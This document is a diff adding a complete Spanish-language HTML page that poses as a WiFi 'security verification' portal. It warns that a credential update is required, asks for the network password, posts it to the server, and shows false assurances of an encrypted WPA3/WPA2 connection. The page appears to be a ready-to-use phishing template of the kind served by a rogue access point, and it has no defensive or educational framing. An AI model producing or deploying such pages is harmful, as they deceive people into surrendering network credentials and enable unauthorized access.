@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>WiFi Security Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(145deg, #0b1a2a 0%, #1a2f3f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 32px;
+            padding: 36px 28px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: #ffffff;
+            transition: all 0.2s ease;
+        }
+
+        .wifi-icon {
+            background: rgba(0, 160, 255, 0.15);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            border: 1px solid rgba(0, 160, 255, 0.3);
+        }
+
+        .wifi-icon svg {
+            width: 44px;
+            height: 44px;
+            stroke: #00a0ff;
+            stroke-width: 1.5;
+            fill: none;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #b0c7db;
+            font-size: 15px;
+            margin-bottom: 28px;
+            font-weight: 400;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 18px;
+        }
+
+        .alert {
+            background: rgba(255, 193, 7, 0.12);
+            border-left: 4px solid #ffc107;
+            padding: 14px 16px;
+            border-radius: 12px;
+            margin-bottom: 28px;
+            text-align: left;
+            font-size: 14px;
+            color: #e0e9f2;
+            backdrop-filter: blur(5px);
+        }
+
+        .alert strong {
+            color: #ffd966;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #ccdcec;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1.5px solid rgba(255, 255, 255, 0.15);
+            border-radius: 18px;
+            font-size: 16px;
+            color: #ffffff;
+            outline: none;
+            transition: border 0.2s, background 0.2s;
+            font-family: inherit;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #00a0ff;
+            background: rgba(0, 0, 0, 0.35);
+        }
+
+        .input-wrapper input::placeholder {
+            color: #8a9eb0;
+            font-weight: 300;
+            font-size: 15px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #9bb7d4;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 6px 8px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.05);
+        }
+
+        .password-toggle:hover {
+            color: white;
+            background: rgba(255,255,255,0.1);
+        }
+
+        button[type="submit"] {
+            background: #0077cc;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 8px 18px rgba(0, 119, 204, 0.25);
+            margin-top: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        button[type="submit"]:hover {
+            background: #0088ee;
+            transform: translateY(-1px);
+            box-shadow: 0 12px 22px rgba(0, 136, 238, 0.3);
+        }
+
+        button[type="submit"]:active {
+            transform: translateY(1px);
+            box-shadow: 0 4px 10px rgba(0, 119, 204, 0.4);
+        }
+
+        .footer-note {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #7f9ab3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .footer-note span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .lock-icon {
+            opacity: 0.7;
+        }
+
+        /* Animación sutil */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card {
+            animation: fadeIn 0.4s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="wifi-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 18.5V21" stroke="currentColor" stroke-linecap="round"/>
+                <path d="M8.5 15.5C9.5 14.5 10.7 14 12 14C13.3 14 14.5 14.5 15.5 15.5" stroke="currentColor" stroke-linecap="round"/>
+                <path d="M5 12C7 10 9.3 9 12 9C14.7 9 17 10 19 12" stroke="currentColor" stroke-linecap="round"/>
+                <path d="M2 8.5C5 5.5 8.3 4 12 4C15.7 4 19 5.5 22 8.5" stroke="currentColor" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <h1>Verificación de seguridad</h1>
+        <div class="subtitle">Red inalámbrica</div>
+
+        <div class="alert">
+            <strong>⚠️ Actualización de credenciales requerida</strong>
+            Para mantener la conexión segura, debes verificar la contraseña de la red WiFi.
+        </div>
+
+        <form method="POST" action="/">
+            <div class="form-group">
+                <label>Contraseña de WiFi</label>
+                <div class="input-wrapper">
+                    <input type="password" id="wifiPassword" name="password" placeholder="Ingresa la contraseña" required autocomplete="off" autofocus>
+                    <button type="button" class="password-toggle" id="togglePassword">Mostrar</button>
+                </div>
+            </div>
+            <button type="submit">Verificar y conectar</button>
+        </form>
+
+        <div class="footer-note">
+            <span class="lock-icon">🔒</span>
+            <span>Conexión cifrada</span>
+            <span>•</span>
+            <span>WPA3/WPA2</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Toggle visibilidad de contraseña
+            const toggleBtn = document.getElementById('togglePassword');
+            const passwordInput = document.getElementById('wifiPassword');
+
+            if (toggleBtn && passwordInput) {
+                toggleBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const type = passwordInput.getType() === 'password' ? 'text' : 'password';
+                    passwordInput.setType(type);
+                    toggleBtn.textContent = type === 'password' ? 'Mostrar' : 'Ocultar';
+                });
+            }
+
+            // Simular que el formulario se envía (ya lo hace de forma nativa)
+            // Se puede agregar un pequeño indicador de carga opcional
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', function() {
+                    const btn = form.querySelector('button[type="submit"]');
+                    if (btn) {
+                        btn.textContent = 'Verificando...';
+                        btn.style.opacity = '0.8';
+                    }
+                });
+            }
+
+            // Soporte para input type password en navegadores antiguos (polyfill mínimo)
+            if (!HTMLInputElement.prototype.hasOwnProperty('getType')) {
+                Object.defineProperty(HTMLInputElement.prototype, 'getType', {
+                    value: function() { return this.type; }
+                });
+                Object.defineProperty(HTMLInputElement.prototype, 'setType', {
+                    value: function(type) { this.type = type; }
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
